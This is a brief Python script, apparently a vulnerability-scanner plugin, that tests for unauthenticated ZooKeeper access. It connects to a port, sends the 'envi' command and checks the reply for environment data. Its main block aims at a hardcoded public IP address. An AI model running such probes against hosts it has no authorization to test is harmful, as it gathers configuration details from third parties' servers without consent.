import socket
from urllib.parse import urlparse

name = 'ZooKeeper 未授权访问漏洞'


def run(url):
    try:
        vulurl = urlparse(url)
        host = vulurl.netloc.split(':')
        ip,port = host[0],int(host[1])
        sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sc.connect((ip, port))
        sc.send(b'envi')
        data = sc.recv(1024).decode()
        sc.close()
        if "Environment" in data and "zookeeper" in data:
            return ['True',name,f'{ip}:{port}']
        else:
            return ['False',name]
    except Exception as e:
        return ['False',name]


if __name__ == '__main__':
    url = 'http://107.182.179.149:2188/'
    print(run(url))